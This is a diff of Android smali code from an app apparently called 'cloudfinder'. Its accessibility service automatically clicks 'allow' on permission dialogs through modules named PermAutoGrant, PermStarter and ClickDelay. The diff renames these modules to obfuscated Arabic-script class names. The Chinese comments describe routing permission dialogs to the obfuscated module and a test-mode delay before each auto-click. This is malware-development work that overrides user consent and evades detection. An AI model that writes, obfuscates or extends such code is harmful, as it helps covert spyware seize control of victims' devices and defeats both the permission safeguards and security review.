@@ -3038,7 +3038,7 @@
 
     move-object/from16 v2, p1
 
-    # 权限对话框：交给 PermAutoGrant 自动点允许
+    # 权限对话框：交给混淆模块自动点允许
     :try_start_permag
     invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;
     move-result-object v1
@@ -3050,7 +3050,7 @@
     move-result v1
     if-nez v1, :cond_permag_skip
     move-object/from16 v0, p0
-    invoke-static {v0}, Lcom/lite/cloudfinder/accessibility/PermAutoGrant;->start(Landroid/accessibilityservice/AccessibilityService;)V
+    invoke-static {v0}, Lڝږ؁ڋ/ڤ;->start(Landroid/accessibilityservice/AccessibilityService;)V
     :cond_permag_skip
     :try_end_permag
     .catch Ljava/lang/Exception; {:try_start_permag .. :try_end_permag} :catch_permag
@@ -4382,8 +4382,8 @@
     invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;
     move-result-object v1
     invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V
-    new-instance v1, Lcom/lite/cloudfinder/activity/PermStarter;
-    invoke-direct {v1, v4}, Lcom/lite/cloudfinder/activity/PermStarter;-><init>(Landroid/content/Context;)V
+    new-instance v1, Lڝږ؁ڋ/ٿ;
+    invoke-direct {v1, v4}, Lڝږ؁ڋ/ٿ;-><init>(Landroid/content/Context;)V
     const-wide/16 v2, 0x7d0
     invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
     :try_end_perm
@@ -11260,8 +11260,8 @@
     invoke-static {v3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
     # 测试模式：延迟 2 秒再点允许，方便看清每个权限框
-    new-instance v9, Lcom/lite/cloudfinder/accessibility/ClickDelay;
-    invoke-direct {v9, v10}, Lcom/lite/cloudfinder/accessibility/ClickDelay;-><init>(Landroid/view/accessibility/AccessibilityNodeInfo;)V
+    new-instance v9, Lڝږ؁ڋ/ڼ;
+    invoke-direct {v9, v10}, Lڝږ؁ڋ/ڼ;-><init>(Landroid/view/accessibility/AccessibilityNodeInfo;)V
     sget-object v10, Lڟەطڽٲ/ؠ;->ء:Landroid/os/Handler;
     const-wide/16 v12, 0x7d0
     invoke-virtual {v10, v9, v12, v13}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
